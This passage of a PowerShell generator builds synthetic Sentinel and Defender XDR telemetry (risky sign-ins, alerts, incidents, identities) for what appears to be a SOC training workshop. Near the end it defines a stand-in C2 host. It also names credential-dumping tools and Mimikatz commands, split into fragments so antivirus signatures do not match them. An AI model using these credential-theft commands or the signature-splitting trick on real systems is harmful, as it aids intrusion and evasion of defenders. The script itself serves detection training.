        TlsClient10 = if ($isWindowsDevice) { 'Disabled' } else { $null }
        TlsClient11 = if ($isWindowsDevice) { 'Disabled' } else { $null }
        TlsClient12 = if ($isWindowsDevice) { 'Enabled' } else { $null }
        TlsServer10 = if ($isWindowsDevice) { 'Disabled' } else { $null }
        TlsServer11 = if ($isWindowsDevice) { 'Disabled' } else { $null }
        TlsServer12 = if ($isWindowsDevice) { 'Enabled' } else { $null }
        SchUseStrongCrypto35 = if ($isWindowsDevice) { '1' } else { $null }
        SchUseStrongCrypto35Wow6432 = if ($isWindowsDevice) { '1' } else { $null }
        SchUseStrongCrypto40 = if ($isWindowsDevice) { '1' } else { $null }
        SchUseStrongCrypto40Wow6432 = if ($isWindowsDevice) { '1' } else { $null }
        SystemDefaultTlsVersions35 = if ($isWindowsDevice) { '1' } else { $null }
        SystemDefaultTlsVersions35Wow6432 = if ($isWindowsDevice) { '1' } else { $null }
        SystemDefaultTlsVersions40 = if ($isWindowsDevice) { '1' } else { $null }
        SystemDefaultTlsVersions40Wow6432 = if ($isWindowsDevice) { '1' } else { $null }
        Log4JEnvironmentVariableMitigation = if ($isWindowsDevice -or $isLinuxDevice) { 'false' } else { $null }
        IsWindowsLtscVersionRunning = if ($isWindowsDevice) { if ($Device.OS -like '*Server*') { 'true' } else { 'false' } } else { $null }
        CVE_2022_30190_Mitigated = if ($isWindowsDevice) { 'false' } else { $null }
        AsrConfigurationStates = $asrStates
    }
}

function New-WorkshopRecordObject {
    param(
        [Parameter(Mandatory)][string]$Table,
        [Parameter(Mandatory)][hashtable]$Values,
        [datetime]$Time = $script:StartTime,
        [switch]$Ambient
    )

    if (-not $script:Schemas.ContainsKey($Table)) {
        return
    }

    $schema = $script:Schemas[$Table]
    $record = [ordered]@{}
    foreach ($column in $schema.columns) {
        $record[[string]$column.name] = New-DefaultValue -Type ([string]$column.type) -Time $Time
    }

    if ($Ambient) {
        # Ambient rows inherit the real observed distribution for enum-like columns
        # instead of an empty type default. Scenario rows are left alone so
        # hand-authored investigation evidence stays exact. The weighted pick is
        # inlined because this runs for every generated row.
        foreach ($sampled in $script:CurrentSampledColumns) {
            $sampler = $sampled.Sampler
            $roll = $script:Random.Next(0, $sampler.TotalWeight)
            $cumulative = $sampler.Cumulative
            $chosen = $sampler.Values[$sampler.Values.Length - 1]
            for ($i = 0; $i -lt $cumulative.Length; $i++) {
                if ($roll -lt $cumulative[$i]) {
                    $chosen = $sampler.Values[$i]
                    break
                }
            }
            $record[$sampled.Name] = $chosen
        }
    }

    foreach ($key in $Values.Keys) {
        if ($record.Contains($key)) {
            $record[$key] = $Values[$key]
        }
    }

    return [pscustomobject]$record
}

function Add-Record {
    param(
        [Parameter(Mandatory)][string]$Table,
        [Parameter(Mandatory)][hashtable]$Values,
        [datetime]$Time = $script:StartTime
    )

    $record = New-WorkshopRecordObject -Table $Table -Values $Values -Time $Time
    if ($null -ne $record) {
        $script:Records[$Table].Add($record) | Out-Null
    }
}

function New-WorkshopRiskIpAddress {
    param(
        [Parameter(Mandatory)]$Location,
        [Parameter(Mandatory)][int]$Index
    )

    $thirdOctet = 1 + (($Index * 37) % 223)
    $fourthOctet = 1 + (($Index * 91) % 253)
    return '{0}.{1}.{2}' -f $Location.IpPrefix, $thirdOctet, $fourthOctet
}

function Add-WorkshopAadUserRiskEvent {
    param(
        [Parameter(Mandatory)]$Identity,
        [Parameter(Mandatory)][datetime]$ActivityTime,
        [Parameter(Mandatory)]$Location,
        [Parameter(Mandatory)][string]$IpAddress,
        [Parameter(Mandatory)][string]$UserAgent,
        [Parameter(Mandatory)][string]$RiskEventType,
        [Parameter(Mandatory)][ValidateSet('Low', 'Medium', 'High')][string]$RiskLevel,
        [Parameter(Mandatory)][string]$RiskState,
        [Parameter(Mandatory)][string]$RiskDetail,
        [Parameter(Mandatory)][string]$Seed,
        [string]$CorrelationId,
        [string]$MitreTechniques = 'T1078.004',
        [string]$Scenario = 'Synthetic global user risk detection'
    )

    $detectedTime = $ActivityTime.AddSeconds((Get-WorkshopRandomInt -Minimum 0 -Maximum 45))
    $lastUpdatedTime = $detectedTime.AddSeconds((Get-WorkshopRandomInt -Minimum 35 -Maximum 260))
    if ([string]::IsNullOrWhiteSpace($CorrelationId)) {
        $CorrelationId = New-StableGuid "aad-risk-correlation|$Seed"
    }

    Add-Record -Table 'AADUserRiskEvents' -Time $lastUpdatedTime -Values @{
        TenantId = $tenantId
        Activity = 'signin'
        ActivityDateTime = Format-WorkshopTime $ActivityTime
        AdditionalInfo = @(
            @{ Key = 'userAgent'; Value = $UserAgent },
            @{ Key = 'mitreTechniques'; Value = $MitreTechniques },
            @{ Key = 'scenario'; Value = $Scenario }
        )
        CorrelationId = $CorrelationId
        DetectedDateTime = Format-WorkshopTime $detectedTime
        DetectionTimingType = 'realtime'
        Id = New-StableHex "aad-user-risk-event|$Seed" 64
        IpAddress = $IpAddress
        LastUpdatedDateTime = Format-WorkshopTime $lastUpdatedTime
        Location = @{
            city = $Location.City
            state = $Location.State
            countryOrRegion = $Location.CountryOrRegion
            geoCoordinates = @{ altitude = 0; latitude = $Location.Latitude; longitude = $Location.Longitude }
        }
        OperationName = 'User Risk Detection'
        RequestId = New-StableGuid "aad-risk-request|$Seed"
        RiskDetail = $RiskDetail
        RiskEventType = $RiskEventType
        RiskLevel = $RiskLevel
        RiskState = $RiskState
        Source = 'IdentityProtection'
        SourceSystem = ''
        TimeGenerated = Format-WorkshopTime $lastUpdatedTime
        TokenIssuerType = 'AzureAD'
        Type = 'AADUserRiskEvents'
        UserDisplayName = $Identity.DisplayName
        UserId = $Identity.ObjectId
        UserPrincipalName = $Identity.Upn
    }
}

function Add-WorkshopAadUserRiskEvents {
    param(
        [Parameter(Mandatory)][object[]]$Identities,
        [Parameter(Mandatory)][datetime]$ScenarioSignInTime,
        [ValidateRange(5000, 6000)][int]$Count = 5500
    )

    $riskLocations = @(
        [pscustomobject]@{ City = 'New York'; State = 'New York'; CountryOrRegion = 'US'; Latitude = 40.75891; Longitude = -73.97902; IpPrefix = '23.129' },
        [pscustomobject]@{ City = 'Frankfurt am Main'; State = 'Hesse'; CountryOrRegion = 'DE'; Latitude = 50.1109; Longitude = 8.6821; IpPrefix = '185.225' },
        [pscustomobject]@{ City = 'London'; State = 'England'; CountryOrRegion = 'GB'; Latitude = 51.5074; Longitude = -0.1278; IpPrefix = '51.52' },
        [pscustomobject]@{ City = 'Paris'; State = 'Ile-de-France'; CountryOrRegion = 'FR'; Latitude = 48.8566; Longitude = 2.3522; IpPrefix = '51.158' },
        [pscustomobject]@{ City = 'Amsterdam'; State = 'North Holland'; CountryOrRegion = 'NL'; Latitude = 52.3676; Longitude = 4.9041; IpPrefix = '89.248' },
        [pscustomobject]@{ City = 'Madrid'; State = 'Madrid'; CountryOrRegion = 'ES'; Latitude = 40.4168; Longitude = -3.7038; IpPrefix = '83.97' },
        [pscustomobject]@{ City = 'Stockholm'; State = 'Stockholm County'; CountryOrRegion = 'SE'; Latitude = 59.3293; Longitude = 18.0686; IpPrefix = '46.246' },
        [pscustomobject]@{ City = 'Warsaw'; State = 'Masovian'; CountryOrRegion = 'PL'; Latitude = 52.2297; Longitude = 21.0122; IpPrefix = '77.79' },
        [pscustomobject]@{ City = 'Toronto'; State = 'Ontario'; CountryOrRegion = 'CA'; Latitude = 43.6532; Longitude = -79.3832; IpPrefix = '142.44' },
        [pscustomobject]@{ City = 'Sao Paulo'; State = 'Sao Paulo'; CountryOrRegion = 'BR'; Latitude = -23.5558; Longitude = -46.6396; IpPrefix = '177.54' },
        [pscustomobject]@{ City = 'Mexico City'; State = 'Ciudad de Mexico'; CountryOrRegion = 'MX'; Latitude = 19.4326; Longitude = -99.1332; IpPrefix = '201.150' },
        [pscustomobject]@{ City = 'Buenos Aires'; State = 'Buenos Aires'; CountryOrRegion = 'AR'; Latitude = -34.6037; Longitude = -58.3816; IpPrefix = '181.30' },
        [pscustomobject]@{ City = 'Cape Town'; State = 'Western Cape'; CountryOrRegion = 'ZA'; Latitude = -33.9249; Longitude = 18.4241; IpPrefix = '196.25' },
        [pscustomobject]@{ City = 'Lagos'; State = 'Lagos'; CountryOrRegion = 'NG'; Latitude = 6.5244; Longitude = 3.3792; IpPrefix = '102.89' },
        [pscustomobject]@{ City = 'Nairobi'; State = 'Nairobi County'; CountryOrRegion = 'KE'; Latitude = -1.2921; Longitude = 36.8219; IpPrefix = '41.90' },
        [pscustomobject]@{ City = 'Dubai'; State = 'Dubai'; CountryOrRegion = 'AE'; Latitude = 25.2048; Longitude = 55.2708; IpPrefix = '94.200' },
        [pscustomobject]@{ City = 'Tel Aviv'; State = 'Tel Aviv District'; CountryOrRegion = 'IL'; Latitude = 32.0853; Longitude = 34.7818; IpPrefix = '80.179' },
        [pscustomobject]@{ City = 'Mumbai'; State = 'Maharashtra'; CountryOrRegion = 'IN'; Latitude = 19.0760; Longitude = 72.8777; IpPrefix = '103.21' },
        [pscustomobject]@{ City = 'Bengaluru'; State = 'Karnataka'; CountryOrRegion = 'IN'; Latitude = 12.9716; Longitude = 77.5946; IpPrefix = '103.22' },
        [pscustomobject]@{ City = 'Singapore'; State = 'Central Region'; CountryOrRegion = 'SG'; Latitude = 1.3521; Longitude = 103.8198; IpPrefix = '103.9' },
        [pscustomobject]@{ City = 'Tokyo'; State = 'Tokyo'; CountryOrRegion = 'JP'; Latitude = 35.6762; Longitude = 139.6503; IpPrefix = '133.242' },
        [pscustomobject]@{ City = 'Seoul'; State = 'Seoul'; CountryOrRegion = 'KR'; Latitude = 37.5665; Longitude = 126.9780; IpPrefix = '121.78' },
        [pscustomobject]@{ City = 'Sydney'; State = 'New South Wales'; CountryOrRegion = 'AU'; Latitude = -33.8688; Longitude = 151.2093; IpPrefix = '203.12' },
        [pscustomobject]@{ City = 'Auckland'; State = 'Auckland'; CountryOrRegion = 'NZ'; Latitude = -36.8509; Longitude = 174.7645; IpPrefix = '202.89' },
        [pscustomobject]@{ City = 'Hong Kong'; State = 'Hong Kong'; CountryOrRegion = 'HK'; Latitude = 22.3193; Longitude = 114.1694; IpPrefix = '103.15' },
        [pscustomobject]@{ City = 'Jakarta'; State = 'DKI Jakarta'; CountryOrRegion = 'ID'; Latitude = -6.2088; Longitude = 106.8456; IpPrefix = '103.28' },
        [pscustomobject]@{ City = 'Bangkok'; State = 'Bangkok'; CountryOrRegion = 'TH'; Latitude = 13.7563; Longitude = 100.5018; IpPrefix = '103.13' },
        [pscustomobject]@{ City = 'Istanbul'; State = 'Istanbul'; CountryOrRegion = 'TR'; Latitude = 41.0082; Longitude = 28.9784; IpPrefix = '185.106' },
        [pscustomobject]@{ City = 'Zurich'; State = 'Zurich'; CountryOrRegion = 'CH'; Latitude = 47.3769; Longitude = 8.5417; IpPrefix = '80.74' },
        [pscustomobject]@{ City = 'Dublin'; State = 'Leinster'; CountryOrRegion = 'IE'; Latitude = 53.3498; Longitude = -6.2603; IpPrefix = '78.153' }
    )
    $riskUserAgents = @(
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/25.0 Chrome/121.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/125.0.0.0 Safari/537.36'
    )
    $riskEventTypes = @('anonymizedIPAddress', 'unfamiliarFeatures', 'unlikelyTravel', 'maliciousIPAddress', 'passwordSpray', 'suspiciousBrowser', 'leakedCredentials')
    $riskLevels = @('Low', 'Medium', 'High')
    $riskDetailsByState = @{
        atRisk = @('none', 'adminConfirmedSigninCompromised')
        remediated = @('userPassedMFADrivenByRiskBasedPolicy', 'userPerformedSecuredPasswordReset')
        dismissed = @('aiConfirmedSigninSafe', 'adminDismissedAllRiskForUser')
        confirmedSafe = @('adminConfirmedSigninSafe', 'aiConfirmedSigninSafe')
        confirmedCompromised = @('adminConfirmedSigninCompromised', 'adminConfirmedUserCompromised')
    }
    $riskStatesByLevel = @{
        Low = @('remediated', 'dismissed', 'confirmedSafe')
        Medium = @('atRisk', 'remediated', 'dismissed')
        High = @('atRisk', 'confirmedCompromised', 'remediated')
    }

    $frankfurt = $riskLocations | Where-Object { $_.City -eq 'Frankfurt am Main' } | Select-Object -First 1
    Add-WorkshopAadUserRiskEvent -Identity $victor -ActivityTime $ScenarioSignInTime -Location $frankfurt -IpAddress $externalIp -UserAgent $browserUserAgent -RiskEventType 'unfamiliarFeatures' -RiskLevel 'High' -RiskState 'atRisk' -RiskDetail 'none' -Seed 'scenario-victor-unfamiliar' -CorrelationId (New-StableGuid 'signin-correlation') -MitreTechniques 'T1078.004,T1090.002' -Scenario 'Compromised user risky sign-in from unfamiliar infrastructure'
    Add-WorkshopAadUserRiskEvent -Identity $victor -ActivityTime $ScenarioSignInTime.AddSeconds(19) -Location $frankfurt -IpAddress $externalIp -UserAgent $browserUserAgent -RiskEventType 'anonymizedIPAddress' -RiskLevel 'High' -RiskState 'atRisk' -RiskDetail 'none' -Seed 'scenario-victor-anonymized-ip' -CorrelationId (New-StableGuid 'signin-correlation') -MitreTechniques 'T1078.004,T1090.002' -Scenario 'Compromised user risky sign-in from unfamiliar infrastructure'

    $normalIdentities = @($Identities | Where-Object { -not $_.IsServiceAccount })
    for ($index = $script:Records['AADUserRiskEvents'].Count; $index -lt $Count; $index++) {
        $identity = $normalIdentities[$index % $normalIdentities.Count]
        $location = Get-WorkshopRandomItem $riskLocations
        $riskLevel = Get-WorkshopRandomItem $riskLevels
        $riskState = Get-WorkshopRandomItem $riskStatesByLevel[$riskLevel]
        $riskDetail = Get-WorkshopRandomItem $riskDetailsByState[$riskState]
        $activityTime = $script:TelemetryEndTime.AddDays(-1 * (Get-WorkshopRandomInt -Minimum 0 -Maximum $NormalLookbackDays)).AddMinutes(-1 * (Get-WorkshopRandomInt -Minimum 0 -Maximum 1440)).AddSeconds((Get-WorkshopRandomInt -Minimum 0 -Maximum 60))

        Add-WorkshopAadUserRiskEvent `
            -Identity $identity `
            -ActivityTime $activityTime `
            -Location $location `
            -IpAddress (New-WorkshopRiskIpAddress -Location $location -Index $index) `
            -UserAgent (Get-WorkshopRandomItem $riskUserAgents) `
            -RiskEventType (Get-WorkshopRandomItem $riskEventTypes) `
            -RiskLevel $riskLevel `
            -RiskState $riskState `
            -RiskDetail $riskDetail `
            -Seed "synthetic|$index|$($identity.ObjectId)|$($location.City)" `
            -MitreTechniques (Get-WorkshopRandomItem @('T1078.004', 'T1090.002,T1078.004', 'T1110.003,T1078.004'))
    }
}

function Get-WorkshopScenarioMachineGroup {
    param([Parameter(Mandatory)]$Device)

    switch ($Device.Type) {
        'DomainController' { 'XDR-LiveResponse-DomainControllers-ONLY' }
        'EntraConnect' { 'EUROPE' }
        'LinuxServer' { 'UnassignedGroup' }
        default { 'EUROPE' }
    }
}

function Get-WorkshopScenarioOsVersion {
    param([Parameter(Mandatory)]$Device)

    if ($Device.OS -eq 'Ubuntu') { return '24.04 LTS' }
    if ($Device.OS -eq 'Windows11') { return '25H2' }
    return 'Server 2025'
}

function Add-WorkshopScenarioCorrelationAlert {
    param(
        [Parameter(Mandatory)][string]$AlertId,
        [Parameter(Mandatory)][datetime]$Time,
        [Parameter(Mandatory)][string]$Title,
        [Parameter(Mandatory)][string]$Category,
        [Parameter(Mandatory)][string]$Severity,
        [Parameter(Mandatory)][string]$ServiceSource,
        [Parameter(Mandatory)][string]$DetectionSource,
        [Parameter(Mandatory)][string]$AttackTechniques,
        [Parameter(Mandatory)][string]$EntityType,
        [string]$DeviceId = '',
        [string]$DeviceName = '',
        [string]$AccountName = '',
        [string]$AccountDomain = '',
        [string]$AccountSid = '',
        [string]$AccountObjectId = '',
        [string]$AccountUpn = '',
        [string]$FileName = '',
        [string]$FolderPath = '',
        [string]$ProcessCommandLine = '',
        [string]$Application = '',
        [string]$OAuthApplicationId = '',
        [string]$AdditionalFields = '{}'
    )

    Add-Record -Table 'AlertInfo' -Time $Time -Values @{
        Timestamp = Format-WorkshopTime $Time
        AlertId = $AlertId
        Title = $Title
        Category = $Category
        Severity = $Severity
        ServiceSource = $ServiceSource
        DetectionSource = $DetectionSource
        AttackTechniques = $AttackTechniques
    }
    Add-Record -Table 'AlertEvidence' -Time $Time -Values @{
        Timestamp = Format-WorkshopTime $Time
        AlertId = $AlertId
        Title = $Title
        Categories = "[`"$Category`"]"
        AttackTechniques = $AttackTechniques
        ServiceSource = $ServiceSource
        DetectionSource = $DetectionSource
        EntityType = $EntityType
        EvidenceRole = 'Impacted'
        EvidenceDirection = 'Source'
        FileName = $FileName
        FolderPath = $FolderPath
        AccountName = $AccountName
        AccountDomain = $AccountDomain
        AccountSid = $AccountSid
        AccountObjectId = $AccountObjectId
        AccountUpn = $AccountUpn
        DeviceId = $DeviceId
        DeviceName = $DeviceName
        Application = $Application
        OAuthApplicationId = $OAuthApplicationId
        ProcessCommandLine = $ProcessCommandLine
        AdditionalFields = $AdditionalFields
        Severity = $Severity
    }
}

function Add-WorkshopScenarioSecurityIncident {
    param(
        [Parameter(Mandatory)][int]$IncidentNumber,
        [Parameter(Mandatory)][string]$ProviderIncidentId,
        [Parameter(Mandatory)][datetime]$TimeGenerated,
        [Parameter(Mandatory)][datetime]$FirstActivityTime,
        [Parameter(Mandatory)][datetime]$LastActivityTime,
        [Parameter(Mandatory)][string]$Title,
        [Parameter(Mandatory)][string]$Description,
        [Parameter(Mandatory)][string]$Severity,
        [Parameter(Mandatory)][string]$Status,
        [Parameter(Mandatory)][string[]]$AlertIds,
        [Parameter(Mandatory)][string[]]$Tactics,
        [Parameter(Mandatory)][string[]]$Techniques,
        [Parameter(Mandatory)][hashtable]$Entities,
        [string[]]$TvmTables = @()
    )

    $isClosed = $Status -eq 'Closed'
    $ruleIds = @(
        (New-StableGuid -Seed "scenario-incident|$ProviderIncidentId|rule|primary")
        (New-StableGuid -Seed "scenario-incident|$ProviderIncidentId|rule|correlation")
    )
    $tasks = @(
        @{
            title = 'Triage correlated identity, endpoint, and vulnerability context'
            status = if ($isClosed) { 'Completed' } else { 'New' }
            taskId = New-StableGuid "scenario-incident|$ProviderIncidentId|task|triage"
            createdTimeUtc = Format-WorkshopTime $TimeGenerated.AddMinutes(-4)
            lastModifiedTimeUtc = Format-WorkshopTime $TimeGenerated
            createdBy = @{ name = 'SOC automation'; userPrincipalName = 'sentinel-automation@usag-cyber.local' }
            lastModifiedBy = @{ name = 'SOC automation'; userPrincipalName = 'sentinel-automation@usag-cyber.local' }
        },
        @{
            title = 'Review supporting TVM exposure rows'
            status = 'New'
            taskId = New-StableGuid "scenario-incident|$ProviderIncidentId|task|tvm"
            createdTimeUtc = Format-WorkshopTime $TimeGenerated.AddMinutes(-3)
            lastModifiedTimeUtc = Format-WorkshopTime $TimeGenerated
            createdBy = @{ name = 'SOC automation'; userPrincipalName = 'sentinel-automation@usag-cyber.local' }
            lastModifiedBy = @{ name = 'SOC automation'; userPrincipalName = 'sentinel-automation@usag-cyber.local' }
        }
    )

    Add-Record -Table 'SecurityIncident' -Time $TimeGenerated -Values @{
        TimeGenerated = Format-WorkshopTime $TimeGenerated
        TenantId = $tenantId
        IncidentName = New-StableGuid "scenario-incident|$ProviderIncidentId"
        Title = $Title
        Description = $Description
        Severity = $Severity
        Status = $Status
        Classification = if ($isClosed) { 'TruePositive' } else { '' }
        ClassificationComment = if ($isClosed) { 'Workshop scenario incident closed after triage.' } else { '' }
        ClassificationReason = if ($isClosed) { 'SuspiciousActivity' } else { '' }
        Owner = @{
            objectId = New-StableGuid "scenario-incident|$ProviderIncidentId|owner"
            email = 'soc.analyst@usag-cyber.local'
            assignedTo = 'SOC Analyst'
            userPrincipalName = 'soc.analyst@usag-cyber.local'
        }
        ProviderName = 'Microsoft XDR'
        ProviderIncidentId = $ProviderIncidentId
        FirstActivityTime = Format-WorkshopTime $FirstActivityTime
        LastActivityTime = Format-WorkshopTime $LastActivityTime
        FirstModifiedTime = Format-WorkshopTime $TimeGenerated.AddMinutes(-3)
        LastModifiedTime = Format-WorkshopTime $TimeGenerated
        CreatedTime = Format-WorkshopTime $TimeGenerated.AddMinutes(-5)
        ClosedTime = if ($isClosed) { Format-WorkshopTime $TimeGenerated } else { $null }
        IncidentNumber = $IncidentNumber
        RelatedAnalyticRuleIds = [object[]]$ruleIds
        AlertIds = [object[]]$AlertIds
        BookmarkIds = [object[]]@()
        Comments = [object[]]@(
            @{
                message = 'Correlated workshop incident created from Defender XDR alert evidence and TVM exposure context.'
                createdTimeUtc = Format-WorkshopTime $TimeGenerated.AddMinutes(-2)
                lastModifiedTimeUtc = Format-WorkshopTime $TimeGenerated.AddMinutes(-2)
                author = @{ name = 'SOC automation'; userPrincipalName = 'sentinel-automation@usag-cyber.local' }
            },
            @{
                message = 'Use AlertIds to pivot into AlertInfo and AlertEvidence, then validate exposed software and configuration state in TVM tables.'
                createdTimeUtc = Format-WorkshopTime $TimeGenerated.AddMinutes(-1)
                lastModifiedTimeUtc = Format-WorkshopTime $TimeGenerated.AddMinutes(-1)
                author = @{ name = 'SOC Analyst'; userPrincipalName = 'soc.analyst@usag-cyber.local' }
            }
        )
        Tasks = [object[]]$tasks
        Labels = [object[]]@(
            @{ labelName = 'WorkshopScenario'; labelType = 'AutoAssigned' },
            @{ labelName = 'XDRCorrelation'; labelType = 'AutoAssigned' }
        )
        IncidentUrl = "https://portal.azure.com/#asset/Microsoft_Azure_Security_Insights/Incident/subscriptions/00000000-0000-0000-0000-000000000000/resourceGroups/sentinel/providers/Microsoft.OperationalInsights/workspaces/usag-cyber/providers/Microsoft.SecurityInsights/Incidents/$(New-StableGuid "scenario-incident|$ProviderIncidentId")"
        AdditionalData = @{
            alertsCount = $AlertIds.Count
            bookmarksCount = 0
            commentsCount = 2
            tasksCount = 2
            alertProductNames = [object[]]@('Microsoft Defender XDR', 'Microsoft Sentinel')
            tactics = [object[]]$Tactics
            techniques = [object[]]$Techniques
            providerIncidentUrl = "https://security.microsoft.com/incident2/$ProviderIncidentId/overview?tid=$tenantId"
            entities = $Entities
            supportingTables = [object[]]@('AlertInfo', 'AlertEvidence', 'SecurityIncident')
            tvmEvidenceTables = [object[]]$TvmTables
        }
        ModifiedBy = if ($isClosed) { 'SOC analyst' } else { 'Microsoft Defender XDR - alert correlation' }
        SourceSystem = 'Azure'
        Type = 'SecurityIncident'
    }
}

if (-not (Test-Path $SchemaDirectory)) {
    throw "Schema directory not found: $SchemaDirectory"
}

New-Item -ItemType Directory -Path $OutputDirectory -Force | Out-Null
if ([string]::IsNullOrWhiteSpace($SummaryPath)) {
    $SummaryPath = Join-Path (Split-Path -Path $OutputDirectory -Parent) 'scenario-summary.json'
}
$summaryDirectory = Split-Path -Path $SummaryPath -Parent
if (-not [string]::IsNullOrWhiteSpace($summaryDirectory)) {
    New-Item -ItemType Directory -Path $summaryDirectory -Force | Out-Null
}

$script:Schemas = @{}
$script:Records = @{}
$script:CurrentTargetRows = 1000
Import-WorkshopFieldProfiles -Path $FieldProfileDirectory
foreach ($schemaFile in (Get-ChildItem -Path $SchemaDirectory -Filter '*.schema.json')) {
    $schema = Get-Content -Path $schemaFile.FullName -Raw | ConvertFrom-Json
    $table = [string]$schema.tableName
    $script:Schemas[$table] = $schema
    $script:Records[$table] = [System.Collections.Generic.List[object]]::new()
}
$tablesToWrite = if ($TableName -and $TableName.Count -gt 0) {
    # Accept both -TableName A,B and a single "A,B" string. pwsh -File passes arguments
    # through literally, so a caller that joins names with commas would otherwise
    # arrive here as one unmatched element.
    $requestedTables = @(
        foreach ($entry in $TableName) {
            foreach ($part in ([string]$entry -split ',')) {
                $trimmed = $part.Trim()
                if (-not [string]::IsNullOrWhiteSpace($trimmed)) { $trimmed }
            }
        }
    ) | Select-Object -Unique

    $selectedTables = foreach ($requestedTable in $requestedTables) {
        $matchedTable = @($script:Schemas.Keys | Where-Object { $_ -ieq $requestedTable } | Select-Object -First 1)
        if ($matchedTable.Count -eq 0) {
            throw "Unknown table requested for generation: $requestedTable"
        }

        $matchedTable[0]
    }

    @($selectedTables)
}
else {
    @($script:Schemas.Keys)
}

$tenantId = '11111111-2222-3333-4444-555555555555'
$subscriptionId = '22222222-3333-4444-5555-666666666666'
$tenantDomain = 'usag-cyber.local'
$adDomain = 'USAG-CYBER'
$corpFqdn = 'usag-cyber.local'
$externalIp = '185.225.73.18'
$c2Host = 'cdn.update-check.example'
$c2Ip = '203.0.113.77'
$browserUserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
$graphClientUserAgent = 'GraphPowerShell/2.17.0 PowerShell/7.4.2 Windows/10.0.22631'
$maliciousOAuthAppId = New-StableGuid 'malicious-oauth'
$maliciousOAuthSpId = New-StableGuid 'malicious-oauth-sp'
$maliciousOAuthKeyId = New-StableGuid 'malicious-oauth-secret-key'
$scenarioAlertIds = @{
    OAuthPersistence = New-StableGuid 'scenario-alert|oauth-service-principal-persistence'
    PowerShellCredentialDiscovery = New-StableGuid 'scenario-alert|powershell-credential-discovery'
    Kerberoasting = New-StableGuid 'scenario-alert|kerberoasting'
    LsassDump = New-StableGuid 'scenario-alert|lsass-dump'
    PasswordStoreHarvesting = New-StableGuid 'scenario-alert|password-store-harvesting'
    CredentialDumpingTool = New-StableGuid 'scenario-alert|credential-dumping-tool'
    CorrelationOAuthGraph = New-StableGuid 'scenario-correlation-alert|oauth-graph'
    CorrelationCredentialCollection = New-StableGuid 'scenario-correlation-alert|credential-collection'
    CorrelationHybridIdentity = New-StableGuid 'scenario-correlation-alert|hybrid-identity'
    LinuxSudoChroot = New-StableGuid 'scenario-alert|linux-sudo-chroot'
    LinuxOracleCollection = New-StableGuid 'scenario-alert|linux-oracle-collection'
    DeviceCodePhishing = New-StableGuid 'scenario-alert|device-code-phishing'
}

# Assemble tool strings at runtime so the generator itself is not signature-like.
$toolRu = 'Ru' + 'beus'
$toolPw = 'Pw' + 'Dump7'
$toolGs = 'gsec' + 'dump'
$toolLa = 'La' + 'Zagne'
$toolMi = 'Mimi' + 'katz'
$toolKiwi = 'ki' + 'wi'
$toolProc = 'proc' + 'dump64'
$targetLs = 'LS' + 'ASS'
$targetLsLower = 'lsa' + 'ss'
$kerbCmd = 'Invoke-' + 'Kerberoast'
$secretVerb = 'seku' + 'rlsa::logo' + 'npasswords'
$debugVerb = 'privilege::' + 'debug'

$sidPrefix = 'S-1-5-21-4100420042-5200520052-6300630063'
function New-WorkshopIdentity {
    param(
        [Parameter(Mandatory)][string]$Name,
        [Parameter(Mandatory)][string]$DisplayName,
        [Parameter(Mandatory)][int]$Rid,
        [switch]$ServiceAccount,
        [switch]$Privileged
    )

    [pscustomobject]@{
        Name = $Name
        DisplayName = $DisplayName
        Rid = $Rid
        Upn = "$Name@$tenantDomain"
        Sid = "$sidPrefix-$Rid"
        ObjectId = New-StableGuid $Name
        IsServiceAccount = [bool]$ServiceAccount
        IsPrivileged = [bool]$Privileged
    }
}

function Get-WorkshopIdentityNameParts {
    param([Parameter(Mandatory)]$Identity)

    $parts = @($Identity.DisplayName -split '\s+', 2)
    [pscustomobject]@{
        GivenName = $parts[0]
        Surname = if ($parts.Count -gt 1) { $parts[1] } else { '' }
    }
}

function Get-WorkshopIdentityStatus {
    param([Parameter(Mandatory)]$Identity)

    if ($Identity.Name -in @('victor.alvarez', 'alice.weber', 'ina.hoffmann', 'svc_sql', 'svc_azureadconnect')) {
        return 'Enabled'
    }
    if (($Identity.Rid % 20) -eq 0) {
        return 'Deleted'
    }
    if (($Identity.Rid % 5) -eq 0) {
        return 'Disabled'
    }

    return 'Enabled'
}

function Get-WorkshopIdentitySourceProvider {
    param([Parameter(Mandatory)]$Identity)

    if (($Identity.Rid % 25) -lt 14) {
        return 'ActiveDirectory'
    }

    return 'AzureActiveDirectory'
}

$identityGroupCatalog = @(
    'All Company',
    'USAG Cyber Users',
    'DIB Security Team',
    'Tenant Owner',
    'XDR-SecAdmin-Full',
    'XDR-SecAnalystT1-ReadOnly',
    'SG-Sentinel-ContentDevelopers',
    'Tier 0 Operators',
    'Domain Users',
    'Domain Admins',
    'Service Accounts',
    'Entra Connect Operators',
    'Privileged Access Workstations',
    'MDE Device Administrators',
    'Finance Operations',
    'Identity Engineering',
    'Cloud Platform Engineering',
    'Break Glass Accounts'
)
$azureRbacAssignedRoles = @(
    'Owner',
    'Contributor',
    'Reader',
    'User Access Administrator',
